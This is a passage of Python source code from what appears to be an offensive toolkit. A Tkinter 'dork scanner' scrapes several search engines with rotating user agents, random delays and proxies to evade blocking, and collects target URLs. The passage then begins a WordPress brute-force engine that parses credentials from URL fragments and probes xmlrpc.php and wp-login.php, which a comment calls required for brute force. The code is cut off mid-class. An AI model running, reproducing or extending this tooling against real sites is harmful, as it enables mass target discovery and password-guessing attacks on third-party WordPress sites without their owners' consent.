        self.save_button = tk.Button(button_frame2, text='[SAVE RESULTS]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_cyan'], command=self.save_results, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.save_button.pack(side=tk.LEFT, padx=(0, 0), fill=tk.X, expand=True)
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(5, 0))
        tk.Label(right_frame, text='Found URLs:', font=('Courier', 10, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        self.urls_text = scrolledtext.ScrolledText(right_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], height=35, wrap=tk.WORD)
        self.urls_text.pack(fill=tk.BOTH, expand=True)
        log_frame = tk.Frame(self.root, bg=self.colors['bg'])
        log_frame.pack(fill=tk.BOTH, expand=False, padx=10, pady=(5, 10))
        tk.Label(log_frame, text='Log:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        self.log_text = scrolledtext.ScrolledText(log_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], height=6, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def select_all_engines(self):
        """Select all search engines"""
        for var, _ in self.engine_vars.values():
            var.set(True)

    def deselect_all_engines(self):
        """Deselect all search engines"""
        for var, _ in self.engine_vars.values():
            var.set(False)

    def browse_save_location(self):
        """Browse for save location"""
        filename = filedialog.asksaveasfilename(title='Save Results', defaultextension='.txt', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            self.save_entry.delete(0, tk.END)
            self.save_entry.insert(0, filename)

    def log(self, message):
        """Add log message"""
        timestamp = time.strftime('[%H:%M:%S]')
        self.log_queue.put(f'{timestamp} {message}\n')

    def process_log_queue(self):
        try:
            while True:
                log_msg = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg)
                self.log_text.see(tk.END)
                line_count = int(self.log_text.index('end-1c').split('.')[0])
                if line_count >= 100:
                    self.log_text.delete(1.0, f'{line_count - 50}.0')
        except queue.Empty:
            pass
        self.root.after(100, self.process_log_queue)

    def _clean_url(self, url):
        """Clean URL - remove appended text after domain"""
        try:
            from urllib.parse import urlunparse
            url = url.rstrip('.,;:!?)\\]}')
            parsed = urlparse(url)
            if parsed.netloc:
                netloc = parsed.netloc
                parts = netloc.split('.')
                if len(parts) >= 2:
                    last_part = parts[-1]
                    match = re.match('^([a-z]{2,10})([A-Z][a-z]+)', last_part, re.IGNORECASE)
                    if match:
                        clean_tld = match.group(1)
                        parts[-1] = clean_tld
                        netloc = '.'.join(parts)
                        parsed = parsed._replace(netloc=netloc)
                        url = urlunparse(parsed)
            return url
        except:
            try:
                url = re.sub('(https?://[a-zA-Z0-9][a-zA-Z0-9\\-\\.]*\\.[a-z]{2,10})([A-Z][a-z]+).*?$', '\\1', url, flags=re.IGNORECASE)
            except:
                pass
            return url

    def _is_filtered_domain(self, domain):
        """Check if domain should be filtered out - strict filtering"""
        domain_lower = domain.lower()
        if len(domain_lower) < 4 or '.' not in domain_lower:
            return True
        parts = domain_lower.split('.')
        tld = parts[-1]
        if len(tld) < 2 or len(tld) > 10:
            return True
        search_engine_exact = ['google.com', 'gstatic.com', 'googleusercontent.com', 'googleapis.com', 'yahoo.com', 'search.yahoo.com', 'r.search.yahoo.com', 'help.yahoo.com', 'bing.com', 'r.bing.com', 'th.bing.com', 'bingj.com', 'bingapp.microsoft.com', 'microsoft.com', 'live.com', 'msn.com', 'altavista.com', 'search.altavista.com']
        for se_domain in search_engine_exact:
            if domain_lower == se_domain or domain_lower.endswith('.' + se_domain):
                return True
        search_engine_patterns = ['google.', 'gstatic.', 'googleusercontent.', 'googleapis.', 'yahoo.', 'bing.', 'microsoft.', 'live.', 'msn.', 'altavista.']
        for se_pattern in search_engine_patterns:
            if domain_lower.startswith(se_pattern) or '.' + se_pattern in domain_lower:
                return True
        non_target_exact = ['w3.org', 'www.w3.org', 'dictionary.cambridge.org', 'cambridge.org', 'facebook.com', 'apple.com', 'cloudflare.com', 'baidu.com', 'wikipedia.org', 'youtube.com', 'twitter.com', 'instagram.com', 'linkedin.com', 'reddit.com', 'amazon.com', 'ebay.com', 'pinterest.com', 'whatsapp.com', 'telegram.org', 'weixin.qq.com', 'wx.qq.com', 'filehelper.weixin.qq.com', 'tencent.com', 'cloud.tencent.com', 'office.com', 'www.office.com', 'techrepublic.com', 'www.techrepublic.com', 'tokopedia.com', 'www.tokopedia.com', 'shopee.co.id', 'www.shopee.co.id', 'devforum.roblox.com', 'axis.bank.in', 'axisbank.co.in', 'www.axis.bank.in', 'vocabulary.com', 'merriam-webster.com', 'oed.com', 'thefreedictionary.com', 'yourdictionary.com', 'geeksforgeeks.org', 'www.geeksforgeeks.org', 'ncert.nic.in', 'epathshala.nic.in', 'yimg.com', 's.yimg.com', 'media.zenfs.com', 'zenfs.com', 'consent.cmp.oath.com', 'oath.com', 'yahooapis.com']
        for nt_domain in non_target_exact:
            if domain_lower == nt_domain or domain_lower.endswith('.' + nt_domain):
                return True
        non_target_patterns = ['w3.org', 'cambridge.org', 'facebook.', 'apple.', 'cloudflare.', 'baidu.', 'wikipedia.', 'youtube.', 'twitter.', 'instagram.', 'linkedin.', 'reddit.', 'amazon.', 'ebay.', 'pinterest.', 'whatsapp.', 'telegram.', 'weixin.', 'wx.qq.', 'tencent.', 'office.', 'techrepublic.', 'tokopedia.', 'shopee.', 'roblox.', 'axis.', 'vocabulary.', 'merriam-webster.', 'oed.', 'thefreedictionary.', 'yourdictionary.', 'geeksforgeeks.', 'ncert.', 'epathshala.', 'yimg.', 'zenfs.', 'oath.', 'yahooapis.']
        for nt_pattern in non_target_patterns:
            if domain_lower.startswith(nt_pattern) or '.' + nt_pattern in domain_lower:
                return True
        valid_short_tlds = ['co', 'uk', 'us', 'in', 'io', 'tv', 'me', 'cc', 'ws', 'to', 'nu', 'ly', 'ai', 'id']
        if len(tld) < 3 and tld not in valid_short_tlds:
            return True
        if re.search('[a-z]{2,10}[A-Z]', tld):
            return True
        return False

    def _is_resource_url(self, url):
        """Check if URL is a resource URL (images, CSS, JS, etc) that should be filtered"""
        url_lower = url.lower()
        resource_patterns = ['/static/', '/pv/static/', '/fz/api/', '/zz/combo', '/static/img/', '/static/lib/', '/static/misc/', '.min.png', '.min.js', '.min.css', '.sprite', '/consent.js', '/consent/', '/cmp.js', '/api/res/', '/api/asset', '/combo?', '/images/', '/img/', '/css/', '/js/', '/assets/', '/media/', '/cdn/', '/static/']
        for pattern in resource_patterns:
            if pattern in url_lower:
                return True
        return False

    def extract_urls_from_html(self, html, base_url, domain_only=False):
        """Extract URLs from search engine HTML - Filter out search engines (Improved)
        
        Args:
            html: HTML content from search engine
            base_url: Base URL of the search engine
            domain_only: If True, extract scheme://netloc (includes subdomain like www.example.com, subdo.example.com), else full URL with path/params
        """
        urls = set()
        from urllib.parse import unquote
        if BeautifulSoup is None:
            return urls
        try:
            soup = BeautifulSoup(html, 'html.parser')
            if 'google.com' in base_url:
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if '/url?q=' in href or '/url?url=' in href:
                        try:
                            if '/url?q=' in href:
                                url = unquote(href.split('/url?q=')[1].split('&')[0])
                            elif '/url?url=' in href:
                                url = unquote(href.split('/url?url=')[1].split('&')[0])
                            else:
                                continue
                            url = self._clean_url(url)
                            parsed = urlparse(url)
                            domain = parsed.netloc.lower()
                            if not self._is_filtered_domain(domain):
                                if self._is_resource_url(url):
                                    continue
                                if parsed.scheme in ['http', 'https'] and parsed.netloc and (len(domain) >= 3):
                                    if domain_only:
                                        clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                    else:
                                        clean_url = url
                                    urls.add(clean_url)
                        except:
                            pass
                for link in soup.find_all('a', href=True):
                    href = link.get('href', '')
                    if not href:
                        continue
                    if href.startswith('http://') or href.startswith('https://'):
                        try:
                            if self._is_resource_url(href):
                                continue
                            href = self._clean_url(href)
                            parsed = urlparse(href)
                            domain = parsed.netloc.lower()
                            if not self._is_filtered_domain(domain):
                                if len(domain) >= 3:
                                    if domain_only:
                                        clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                    else:
                                        clean_url = href
                                    urls.add(clean_url)
                        except:
                            pass
                for attr in ['data-url', 'data-href', 'data-link', 'data-uri', 'data-src']:
                    for element in soup.find_all(attrs={attr: True}):
                        try:
                            url = element.get(attr)
                            if url and (url.startswith('http://') or url.startswith('https://')):
                                if self._is_resource_url(url):
                                    continue
                                url = self._clean_url(url)
                                parsed = urlparse(url)
                                domain = parsed.netloc.lower()
                                if not self._is_filtered_domain(domain):
                                    if len(domain) >= 3:
                                        if domain_only:
                                            clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                        else:
                                            clean_url = url
                                        urls.add(clean_url)
                        except:
                            pass
                for element in soup.find_all(['div', 'span', 'p', 'li', 'td']):
                    text = element.get_text()
                    if text and ('http://' in text or 'https://' in text):
                        url_matches = re.findall('https?://[^\\s<>"\\\'{}|\\\\^`\\[\\]()]+', text)
                        for url_match in url_matches:
                            try:
                                url_match = self._clean_url(url_match)
                                parsed = urlparse(url_match)
                                domain = parsed.netloc.lower()
                                if not self._is_filtered_domain(domain):
                                    if len(domain) >= 3:
                                        if domain_only:
                                            clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                        else:
                                            clean_url = url_match
                                        urls.add(clean_url)
                            except:
                                pass
            elif 'bing.com' in base_url:
                for link in soup.find_all('a', href=True):
                    href = link.get('href', '')
                    if not href:
                        continue
                    if href.startswith('http://') or href.startswith('https://'):
                        try:
                            if self._is_resource_url(href):
                                continue
                            parsed = urlparse(href)
                            domain = parsed.netloc.lower()
                            if not self._is_filtered_domain(domain):
                                if not domain.startswith('r.') and 'redirect' not in domain:
                                    if len(domain) >= 3:
                                        if domain_only:
                                            clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                        else:
                                            clean_url = href
                                        urls.add(clean_url)
                        except:
                            pass
                for h2 in soup.find_all('h2'):
                    for link in h2.find_all('a', href=True):
                        href = link.get('href', '')
                        if href.startswith('http://') or href.startswith('https://'):
                            try:
                                if self._is_resource_url(href):
                                    continue
                                parsed = urlparse(href)
                                domain = parsed.netloc.lower()
                                if not self._is_filtered_domain(domain):
                                    if len(domain) >= 3:
                                        if domain_only:
                                            clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                        else:
                                            clean_url = href
                                        urls.add(clean_url)
                            except:
                                pass
                for element in soup.find_all(['cite', 'h3']):
                    text = element.get_text()
                    if text and ('http://' in text or 'https://' in text):
                        url_matches = re.findall('https?://[^\\s<>"\\\'{}|\\\\^`\\[\\]()]+', text)
                        for url_match in url_matches:
                            try:
                                if self._is_resource_url(url_match):
                                    continue
                                url_match = self._clean_url(url_match)
                                parsed = urlparse(url_match)
                                domain = parsed.netloc.lower()
                                if not self._is_filtered_domain(domain):
                                    if len(domain) >= 3:
                                        if domain_only:
                                            clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                        else:
                                            clean_url = url_match
                                        urls.add(clean_url)
                            except:
                                pass
                for element in soup.find_all(True):
                    for attr in element.attrs:
                        attr_value = str(element.get(attr, ''))
                        if attr_value and ('http://' in attr_value or 'https://' in attr_value):
                            url_matches = re.findall('https?://[^\\s<>"\\\'{}|\\\\^`\\[\\]()]+', attr_value)
                            for url_match in url_matches:
                                try:
                                    parsed = urlparse(url_match)
                                    domain = parsed.netloc.lower()
                                    if not self._is_filtered_domain(domain):
                                        if len(domain) >= 3:
                                            if domain_only:
                                                clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                            else:
                                                clean_url = url_match
                                            urls.add(clean_url)
                                except:
                                    pass
            elif 'yahoo.com' in base_url or 'search.yahoo.com' in base_url:
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    try:
                        if 'r.search.yahoo.com' in href and 'RU=' in href:
                            try:
                                ru_part = href.split('RU=')[1].split('/RK=')[0]
                                url = unquote(ru_part)
                                parsed = urlparse(url)
                                domain = parsed.netloc.lower()
                                if self._is_filtered_domain(domain):
                                    continue
                                if parsed.scheme in ['http', 'https'] and parsed.netloc and (len(domain) >= 3):
                                    if domain_only:
                                        clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                    else:
                                        clean_url = url
                                    urls.add(clean_url)
                            except:
                                pass
                        elif href.startswith('http://') or href.startswith('https://'):
                            try:
                                parsed = urlparse(href)
                                domain = parsed.netloc.lower()
                                if self._is_filtered_domain(domain):
                                    continue
                                if parsed.scheme in ['http', 'https'] and parsed.netloc and (len(domain) >= 3):
                                    if domain_only:
                                        clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                    else:
                                        clean_url = href
                                    urls.add(clean_url)
                            except:
                                pass
                    except:
                        pass
                for element in soup.find_all(['span', 'div', 'h3', 'p', 'li', 'td', 'a']):
                    text = element.get_text()
                    if text and ('http://' in text or 'https://' in text):
                        url_matches = re.findall('https?://[^\\s<>"\\\'{}|\\\\^`\\[\\]]+', text)
                        for url in url_matches:
                            try:
                                url = self._clean_url(url)
                                parsed = urlparse(url)
                                domain = parsed.netloc.lower()
                                if self._is_filtered_domain(domain):
                                    continue
                                if parsed.scheme in ['http', 'https'] and parsed.netloc and (len(domain) >= 3):
                                    if domain_only:
                                        clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                    else:
                                        clean_url = url
                                    urls.add(clean_url)
                            except:
                                pass
            else:
                for link in soup.find_all('a', href=True):
                    href = link.get('href', '')
                    if href.startswith('http://') or href.startswith('https://'):
                        try:
                            href = self._clean_url(href)
                            parsed = urlparse(href)
                            domain = parsed.netloc.lower()
                            if self._is_filtered_domain(domain):
                                continue
                            if parsed.scheme in ['http', 'https'] and parsed.netloc:
                                if domain_only:
                                    clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                else:
                                    clean_url = href
                                urls.add(clean_url)
                        except:
                            pass
                for element in soup.find_all(['div', 'span', 'p', 'li', 'h3', 'cite', 'td', 'h1', 'h2', 'h4', 'h5', 'h6', 'a', 'strong', 'em', 'b', 'i', 'th']):
                    text = element.get_text()
                    if text and ('http://' in text or 'https://' in text):
                        url_matches = re.findall('https?://[^\\s<>"\\\'{}|\\\\^`\\[\\]]+', text)
                        url_matches.extend(re.findall('https?://[a-zA-Z0-9][a-zA-Z0-9\\-\\.]*\\.[a-zA-Z]{2,}[^\\s<>"\\\'{}|\\\\^`\\[\\]]*', text))
                        for url_match in url_matches:
                            try:
                                url_match = self._clean_url(url_match)
                                parsed = urlparse(url_match)
                                domain = parsed.netloc.lower()
                                if self._is_filtered_domain(domain):
                                    continue
                                if parsed.scheme in ['http', 'https'] and parsed.netloc and (len(domain) >= 3):
                                    if domain_only:
                                        clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                    else:
                                        clean_url = url_match
                                    urls.add(clean_url)
                            except:
                                pass
                for element in soup.find_all(True):
                    for attr in element.attrs:
                        attr_value = str(element.get(attr, ''))
                        if attr_value and ('http://' in attr_value or 'https://' in attr_value):
                            url_matches = re.findall('https?://[^\\s<>"\\\'{}|\\\\^`\\[\\]]+', attr_value)
                            for url_match in url_matches:
                                try:
                                    parsed = urlparse(url_match)
                                    domain = parsed.netloc.lower()
                                    if self._is_filtered_domain(domain):
                                        continue
                                    if parsed.scheme in ['http', 'https'] and parsed.netloc and (len(domain) >= 3):
                                        if domain_only:
                                            clean_url = f'{parsed.scheme}://{parsed.netloc}'
                                        else:
                                            clean_url = url_match
                                        urls.add(clean_url)
                                except:
                                    pass
        except Exception:
            pass
        filtered_urls = set()
        for url in urls:
            try:
                url = self._clean_url(url)
                parsed = urlparse(url)
                domain = parsed.netloc.lower()
                if len(domain) < 4 or '.' not in domain:
                    continue
                if self._is_filtered_domain(domain):
                    continue
                if parsed.scheme in ['http', 'https'] and parsed.netloc:
                    if domain_only:
                        clean_url = f'{parsed.scheme}://{parsed.netloc}'
                    else:
                        clean_url = url.rstrip('/').split('#')[0]
                    filtered_urls.add(clean_url)
            except:
                pass
        return filtered_urls

    def scan_search_engine(self, template, dork, max_pages=5, domain_only=False, proxy=None):
        if self.stop_flag:
            return set()
        all_urls = set()
        try:
            effective_max_pages = min(max_pages, 50)
            retry_count = 0
            max_retries = 3
            for page in range(effective_max_pages):
                if self.stop_flag:
                    break
                if 'google.com' in template:
                    if 'start=' in template:
                        start_match = re.search('start=(\\d+)', template)
                        base_start = int(start_match.group(1)) if start_match else 0
                        start = base_start + page * 10
                        url = template.replace('{aranacakkelime}', quote(dork))
                        url = re.sub('start=\\d+', f'start={start}', url)
                    else:
                        start = page * 10
                        url = template.replace('{aranacakkelime}', quote(dork)) + f'&start={start}'
                elif 'bing.com' in template:
                    if 'first=' in template:
                        first_match = re.search('first=(\\d+)', template)
                        base_first = int(first_match.group(1)) if first_match else 1
                        first = base_first + page * 50
                        url = template.replace('{aranacakkelime}', quote(dork))
                        url = re.sub('first=\\d+', f'first={first}', url)
                    else:
                        first = page * 50 + 1
                        url = template.replace('{aranacakkelime}', quote(dork)) + f'&first={first}'
                elif 'yahoo.com' in template:
                    url = template.replace('{aranacakkelime}', quote(dork))
                    if 'b=' in template:
                        b_match = re.search('b=(\\d+)', template)
                        base_b = int(b_match.group(1)) if b_match else 101
                        b = base_b + page * 100
                        url = re.sub('b=\\d+', f'b={b}', url)
                    elif page > 0:
                        url = url.replace('n=100', f'n=100&b={page * 100 + 1}')
                elif 'altavista.com' in template:
                    url = template.replace('{aranacakkelime}', quote(dork))
                    if 'stq=' in template:
                        stq_match = re.search('stq=(\\d+)', template)
                        base_stq = int(stq_match.group(1)) if stq_match else 0
                        stq = base_stq + page * 50
                        url = re.sub('stq=\\d+', f'stq={stq}', url)
                else:
                    url = template.replace('{aranacakkelime}', quote(dork))
                page_urls = set()
                for attempt in range(max_retries):
                    if self.stop_flag:
                        break
                    try:
                        headers = DORK_DEFAULT_HEADERS.copy()
                        headers['User-Agent'] = random.choice(DORK_USER_AGENTS)
                        headers['Accept-Language'] = random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en;q=0.9'])
                        if page > 0:
                            delay = random.uniform(1.0, 2.0) + attempt * 0.5
                        else:
                            delay = random.uniform(0.5, 1.5) + attempt * 0.3
                        time.sleep(delay)
                        proxies = None
                        if proxy and proxy.strip():
                            proxies = {'http': proxy, 'https': proxy}
                        response = requests.get(url, headers=headers, timeout=30, verify=False, allow_redirects=True, proxies=proxies)
                        if response.status_code == 200:
                            urls = self.extract_urls_from_html(response.text, url, domain_only=domain_only)
                            page_urls.update(urls)
                            retry_count = 0
                            break
                        elif response.status_code == 429 or response.status_code >= 500:
                            retry_count += 1
                            if attempt < max_retries - 1:
                                wait_time = 2 ** attempt + random.uniform(0, 1)
                                if page == 0:
                                    self.log(f'[WARN] Status {response.status_code}, retrying in {wait_time:.1f}s... (attempt {attempt + 1}/{max_retries})')
                                time.sleep(wait_time)
                                continue
                            else:
                                if page == 0:
                                    self.log(f'[WARN] Status {response.status_code}, max retries reached, skipping page {page + 1}...')
                                break
                        else:
                            if page == 0 and attempt == 0:
                                self.log(f'[DEBUG] Status {response.status_code} for {dork[:40]}...')
                            break
                    except requests.exceptions.RequestException as e:
                        retry_count += 1
                        if attempt < max_retries - 1:
                            wait_time = 2 ** attempt + random.uniform(0, 1)
                            if page == 0:
                                self.log(f'[WARN] Request error: {str(e)[:50]}, retrying in {wait_time:.1f}s...')
                            time.sleep(wait_time)
                            continue
                        else:
                            if page == 0:
                                self.log(f'[ERROR] Request failed after {max_retries} attempts: {str(e)[:50]}')
                            break
                if page_urls:
                    all_urls.update(page_urls)
                    if page == 0 or (page + 1) % 5 == 0:
                        self.log(f'[DEBUG] Found {len(page_urls)} URLs from {dork[:40]}... (Page {page + 1}/{effective_max_pages})')
                elif page == 0:
                    self.log(f'[DEBUG] No URLs extracted from {dork[:40]}...')
                if not page_urls and page >= 1:
                    break
                if page_urls:
                    time.sleep(random.uniform(0.8, 1.5))
                else:
                    time.sleep(random.uniform(0.5, 1.0))
            if all_urls:
                self.log(f'Found {len(all_urls)} valid URLs from {dork[:50]}...')
            elif max_pages > 0:
                pass
            return all_urls
        except Exception as e:
            self.log(f'Error scanning {dork[:50]}: {str(e)}')
        return set()

    def start_scan(self):
        if self.is_scanning:
            return
        dorks = [d.strip() for d in self.dorks_text.get(1.0, tk.END).strip().split('\n') if d.strip()]
        if not dorks:
            messagebox.showwarning('Warning', 'Please enter dorks!')
            return
        selected_templates = []
        for var, template in self.engine_vars.values():
            if var.get():
                selected_templates.append(template)
        if not selected_templates:
            messagebox.showwarning('Warning', 'Please select at least one search engine!')
            return
        domain_only = self.domain_only_var.get()
        proxy = self.proxy_entry.get().strip()
        if proxy and (not proxy.startswith('http')):
            proxy = 'http://' + proxy
        try:
            max_pages = int(self.max_pages_var.get())
            if max_pages < 1:
                max_pages = 10
            if max_pages > 100:
                max_pages = 100
        except:
            max_pages = 10
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        self.found_urls_file = f'dork_scanner_urls_{timestamp}.txt'
        self.is_scanning = True
        self.stop_flag = False
        self.found_urls = set()
        self.scanned_pages = 0
        self.total_sites = 0
        self.proxy = proxy
        self.max_pages = max_pages
        self.start_button.config(state=tk.DISABLED)
        self.pause_button.config(state=tk.NORMAL)
        mode_text = 'Domain Only' if domain_only else 'Full URL with Parameters'
        self.log(f'Starting scan with {len(dorks)} dorks and {len(selected_templates)} engines...')
        self.log(f'Mode: {mode_text}')
        self.log(f'Results will be saved to: {self.found_urls_file}')
        thread = threading.Thread(target=self.scan_worker_optimized, args=(dorks, selected_templates, domain_only, proxy, max_pages), daemon=True)
        thread.start()

    def scan_worker_optimized(self, dorks, templates, domain_only=False, proxy=None, max_pages=2):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        total_tasks = len(dorks) * len(templates)
        file_urls_count = 0
        try:
            with open(self.found_urls_file, 'w', encoding='utf-8') as f:
                f.write(f"# Dork Scanner Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total Dorks: {len(dorks)} | Engines: {len(templates)}\n\n')
            optimal_workers = min(4, len(templates), len(dorks) * len(templates) // 10 + 1)
            max_workers = max(1, optimal_workers)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {}
                for dork in dorks:
                    if self.stop_flag:
                        break
                    for template in templates:
                        if self.stop_flag:
                            break
                        future = executor.submit(self.scan_search_engine, template, dork, max_pages=max_pages, domain_only=domain_only, proxy=proxy)
                        futures[future] = (dork, template)
                for future in as_completed(futures):
                    if self.stop_flag:
                        break
                    try:
                        urls = future.result(timeout=30)
                        dork, template = futures[future]
                        if urls:
                            with self.url_lock:
                                new_urls = []
                                with open(self.found_urls_file, 'a', encoding='utf-8') as f:
                                    for url in urls:
                                        if url not in self.found_urls:
                                            f.write(f'{url}\n')
                                            new_urls.append(url)
                                            self.found_urls.add(url)
                                            file_urls_count += 1
                                self.total_sites = len(self.found_urls)
                        elif self.scanned_pages % 500 == 0 and self.total_sites == 0:
                            self.log(f'[DEBUG] No URLs found yet. Checked {self.scanned_pages} pages. Sample: {dork[:50]}...')
                        self.scanned_pages += 1
                        if self.scanned_pages % 10 == 0:
                            self.root.after(0, self.update_ui)
                            self.log(f'Progress: {self.scanned_pages}/{total_tasks} pages | Found: {self.total_sites} URLs')
                        time.sleep(random.uniform(0.5, 1.5))
                    except Exception as e:
                        self.log(f'Error in scan task: {str(e)[:100]}')
                        continue
        except Exception as e:
            self.log(f'Error in scan worker: {str(e)}')
        self.is_scanning = False
        self.root.after(0, self.scan_finished)

    def scan_worker(self, dorks, templates):
        """Legacy scan worker (backward compatibility)"""
        self.scan_worker_optimized(dorks, templates)

    def update_ui(self):
        try:
            if not hasattr(self, 'stats_label') or not hasattr(self, 'urls_text'):
                return
            try:
                if not self.stats_label.winfo_exists() or not self.urls_text.winfo_exists():
                    return
            except:
                return
            selected_count = len([v for v, _ in self.engine_vars.values() if v.get()])
            try:
                self.stats_label.config(text=f'Total Pages: {len(self.engine_vars)} | Active Channels: {selected_count} | Total Sites: {self.total_sites:,} | Scanned: {self.scanned_pages}')
            except:
                pass
            try:
                self.urls_text.delete(1.0, tk.END)
            except:
                return
            with self.url_lock:
                sorted_urls = sorted(self.found_urls)
                display_limit = 2000
            for url in sorted_urls[:display_limit]:
                try:
                    self.urls_text.insert(tk.END, f'{url}\n')
                except:
                    break
            if self.total_sites > display_limit:
                remaining = self.total_sites - display_limit
                try:
                    self.urls_text.insert(tk.END, f'\n[... {remaining:,} more URLs saved to file: {self.found_urls_file} ...]\n')
                except:
                    pass
        except:
            pass

    def scan_finished(self):
        """Called when scan is finished"""
        self.start_button.config(state=tk.NORMAL)
        self.pause_button.config(state=tk.DISABLED)
        unique_count = self.total_sites
        if self.found_urls_file and os.path.exists(self.found_urls_file):
            try:
                with open(self.found_urls_file, 'r', encoding='utf-8') as f:
                    lines = [line.strip() for line in f if line.strip() and (not line.strip().startswith('#'))]
                    unique_count = len(set(lines))
            except:
                pass
        self.log(f'Scan completed! Found {unique_count:,} unique URLs')
        messagebox.showinfo('Success', f'Scan completed!\nFound {unique_count:,} unique URLs\n\nSaved to: {self.found_urls_file}')

    def pause_scan(self):
        """Pause scan"""
        self.stop_flag = True
        self.is_scanning = False
        self.pause_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log('Scan paused')

    def save_results(self):
        filename = self.save_entry.get().strip()
        if not filename:
            filename = filedialog.asksaveasfilename(title='Save Results', defaultextension='.txt', filetypes=[('Text files', '*.txt'), ('All files', '*.*')])
        if filename:
            try:
                if self.found_urls_file and os.path.exists(self.found_urls_file):
                    seen = set()
                    count = 0
                    with open(self.found_urls_file, 'r', encoding='utf-8') as infile:
                        with open(filename, 'w', encoding='utf-8') as outfile:
                            for line in infile:
                                line = line.strip()
                                if line and (not line.startswith('#')):
                                    if line not in seen:
                                        seen.add(line)
                                        outfile.write(f'{line}\n')
                                        count += 1
                    self.log(f'Results saved to: {filename} ({count:,} unique URLs)')
                    messagebox.showinfo('Success', f'Saved {count:,} unique URLs to:\n{filename}')
                elif self.found_urls:
                    with open(filename, 'w', encoding='utf-8') as f:
                        for url in sorted(self.found_urls):
                            f.write(f'{url}\n')
                    self.log(f'Results saved to: {filename}')
                    messagebox.showinfo('Success', f'Saved {len(self.found_urls):,} URLs to:\n{filename}')
                else:
                    messagebox.showwarning('Warning', 'No URLs to save!')
            except Exception as e:
                messagebox.showerror('Error', f'Error saving: {str(e)}')

class ELVBruteforceEngine:
    """E.L.V  Brute Force Engine - Advanced Intelligence"""

    def __init__(self, callback=None):
        self.callback = callback
        self.stop_flag = False
        self.session = requests.Session()
        self.session.headers.update(DEFAULT_HEADERS)

    def set_proxy(self, proxy):
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

    def extract_credentials_from_url(self, url):
        """Extract credentials dari URL fragment format: #username@password"""
        credentials = None
        try:
            parsed = urlparse(url)
            fragment = parsed.fragment
            if fragment and '@' in fragment:
                parts = fragment.split('@', 1)
                if len(parts) == 2:
                    cred_username = parts[0].strip()
                    cred_password = parts[1].strip()
                    if cred_username and cred_password:
                        credentials = {'username': cred_username, 'password': cred_password}
        except:
            pass
        return credentials

    def normalize_url(self, url):
        """Normalize URL - remove wp-login.php dan normalize"""
        original_url = url.strip()
        url = original_url
        parsed = urlparse(url)
        if parsed.fragment and '@' in parsed.fragment:
            url = url.split('#')[0]
        url = url.replace('/wp-login.php', '').replace('wp-login.php', '')
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')

    def check_xmlrpc(self, url, timeout=10):
        """Cek apakah WordPress punya XML-RPC (required untuk brute force)"""
        xmlrpc_urls = [urljoin(url, '/xmlrpc.php'), urljoin(url, '/wp-xmlrpc.php')]
        for xmlrpc_url in xmlrpc_urls:
            try:
                response = self.session.get(xmlrpc_url, timeout=timeout, allow_redirects=False, verify=False)
                if response.status_code in [200, 405]:
                    if response.text and ('xmlrpc' in response.text.lower() or 'XML-RPC' in response.text):
                        return True
                    if response.status_code == 405:
                        return True
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
        return False

    def check_wp_login(self, url, timeout=10):
        """Cek apakah wp-login.php ada"""
        login_url = urljoin(url, '/wp-login.php')
        try:
            response = self.session.get(login_url, timeout=timeout, allow_redirects=False, verify=False)
            if response.status_code not in [200, 302, 301, 403, 401]:
                if url.startswith('https://'):
                    http_url = url.replace('https://', 'http://')
                    login_url = urljoin(http_url, '/wp-login.php')
                    response = self.session.get(login_url, timeout=timeout, allow_redirects=False, verify=False)
                    if response.status_code not in [200, 302, 301, 403, 401]:
                        return False
                else:
                    return False
            response_text = response.text.lower() if response.text else ''
            found_indicators = sum((1 for indicator in WP_LOGIN_INDICATORS if indicator in response_text)) if response_text else 0
            if found_indicators >= 3 or 'wp-login' in response.url.lower():
                return True
            return False
        except requests.exceptions.Timeout:
            return False
        except requests.exceptions.ConnectionError:
            if url.startswith('https://'):
                try:
                    http_url = url.replace('https://', 'http://')
                    login_url = urljoin(http_url, '/wp-login.php')
                    response = self.session.get(login_url, timeout=timeout, allow_redirects=False, verify=False)
                    if response.status_code in [200, 302, 301, 403, 401]:
                        response_text = response.text.lower()
                        found_indicators = sum((1 for indicator in WP_LOGIN_INDICATORS if indicator in response_text))
                        return found_indicators >= 3 or 'wp-login' in response.url.lower()
                except:
                    pass
            return False
        except Exception:
            return False

    def extract_domain_name(self, url):
